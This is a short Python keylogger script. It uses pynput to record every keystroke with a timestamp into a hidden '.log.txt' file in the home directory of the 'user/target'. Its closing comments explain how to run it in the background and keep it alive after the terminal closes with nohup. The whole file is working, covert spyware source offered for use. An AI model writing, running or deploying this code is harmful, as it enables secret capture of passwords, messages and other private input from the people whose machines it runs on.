# Very Simple Python3 Keylogger.

import pynput
from pynput.keyboard import Key, Listener
import logging
import os

# Directory where log will be saved.
dir =  os.environ['HOME']

# Name of log (.log.txt), to be saved as hidden file in user/target's home directory.
# Each entry timestamped.
logging.basicConfig(filename = (dir + "/.log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
   logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()

# To background, append call with '&'
# ex: python3 keystroke.py&

# To keep running after terminal is closed, use 'nohup'.
# ex: nohup python3 keystroke.py&